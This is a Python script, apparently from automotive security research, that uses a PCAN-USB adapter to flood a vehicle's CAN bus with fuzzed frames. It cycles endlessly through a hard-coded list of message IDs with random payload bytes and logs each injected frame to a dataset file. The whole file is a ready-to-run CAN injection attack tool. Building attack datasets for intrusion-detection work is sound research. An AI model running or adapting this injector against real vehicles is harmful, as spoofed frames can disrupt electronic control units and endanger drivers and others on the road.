from PCANBasic import *
import time
import random
import datetime
import os

unused_bits = {'03FE': [2, '00'], '0238': [2, '9A'], '03DC': [0, '40'], '0502': [0, '00'], '027D': [0, '01'],
 '0284': [0, '10'], '0321': [4, '02'], '030E': [1, '00'], '02A8': [1, '00'], '032E': [0, '00'], '03F8': [0, '03'],
 '0231': [2, '00'], '02BC': [7, '01'], '0257': [6, '00'], '0479': [0, '00'], '0401': [0, '81'], '03D5': [1, '00'],
 '0420': [0, '28'], '02E8': [1, '00'], '0353': [1, '0F'], '037E': [2, '00'], '0103': [2, '00'], '0129': [6, 'FF'],
 '0717': [2, '00'], '03F4': [5, '01'], '0031': [2, '02'], '036F': [0, '08'], '0391': [2, '00'], '03AF': [7, 'FF'],
 '0145': [2, '00'], '030F': [3, '01'], '0410': [1, '00'], '034F': [7, 'FF'], '03C2': [1, '55'], '032B': [0, '00'],
 '0448': [0, '00'], '035D': [1, '00'], '0128': [0, '00'], '0428': [0, '00'], '0350': [0, '00'], '0371': [1, '00'], 
 '03B8': [0, '00'], '03F7': [0, '00'], '03CB': [1, '00'], '03EF': [0, '00'], '031E': [3, '14'], '0303': [0, '03'], 
 '03CA': [0, '00'], '0249': [3, '00'], '0227': [2, '00'], '03D1': [5, '00'], '021E': [4, '00'], '0186': [7, '00'],
 '0102': [2, '00'], '02F8': [5, 'DE'], '03FD': [1, '00'], '02D1': [0, 'FF'], '03FA': [7, 'FF'], '024A': [0, '00'],
 '03FC': [1, '00'], '0419': [0, '00'], '0558': [0, '84'], '036C': [0, '00'], '0239': [5, '7D'], '026E': [1, '00'],
 '039D': [4, '00'], '0221': [2, '55'], '0399': [4, 'B0'], '0108': [7, '00'], '0329': [0, '00'], '004F': [6, '79'],
 '0229': [2, '00'], '025F': [0, 'C4'], '0326': [1, '00'], '0439': [0, '00'], '0334': [0, '1F'], '0293': [0, '00'],
 '0267': [3, '00'], '03C3': [0, '55'], '0051': [2, '0A'], '0425': [0, '00'], '0720': [0, '00'], '03F0': [0, '00'],
 '0259': [0, 'D3'], '0429': [0, '00'], '03C9': [0, '03'], '0395': [1, '00'], '0449': [0, '00'], '033E': [0, '00'],
 '0459': [0, '00'], '0369': [1, '00'], '0740': [1, '00'], '0211': [2, '41'], '0234': [3, '09'],  '03DF': [0, '00'], 
 '0235': [1, '01']}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

x = datetime.datetime.now()
x = "Dataset\\Fuzzing Attack Injected Datas " + str(x).split()[0] + "-"
ind = 0

while os.path.isfile( x + str(ind) + ".txt"):
    ind += 1
    print("Yes")

print("No")
x = x + str(ind) + ".txt"
f = open(x, "a")




def Fuzzing_Attack(id, leng, data):
    all_datas = ""
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(id, 16)
    Fuzzing_attack.LEN = leng
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.LEN)

    if id in unused_bits:
        check_ind = unused_bits[id][0]
        check_val = unused_bits[id][1]
    else:
        check_ind = 123
        check_val = 123
    
    for i in range(leng):
        if check_ind == i and check_val == data[i]:            
            Fuzzing_attack.DATA[i] = int(data[i], 16) + 3
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Fuzzing_attack.DATA[i])) + bcolors.ENDC
        else:
            Fuzzing_attack.DATA[i] = int(data[i], 16)
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))
    
    CAN.Write(CAN_BUS, Fuzzing_attack)
    print(all_datas)
    all_datas += "\n"
    f.write(all_datas)

if __name__ == "__main__":
    CAN = PCANBasic()                            #CANi
    CAN_BUS = PCAN_USBBUS6
    counter = 0    
    start_time = time.time()
    ind = 0
    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    id_exist = False
    if result != PCAN_ERROR_OK:
        # An error occurred, get a text describing the error and show it
        #
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
    while True:
        # time_offset = random.randrange(1, 50) / 1000
        time_offset = 0.03
        
        injection_id = random.choice(list(unused_bits.keys()))
                        
        print(bcolors.OKBLUE + str(injection_id) + bcolors.ENDC)
        attack_data = []
        
        leng = 8
        
        for i in range(leng):
            if id_exist and i == unused_bits[injection_id][0]:
                attack_data.append(unused_bits[injection_id][1])
            else:
                attack_data.append(hex(random.randrange(0, 255)))
        id_exist = False
        Fuzzing_Attack(injection_id, leng, attack_data)
        time.sleep(time_offset)
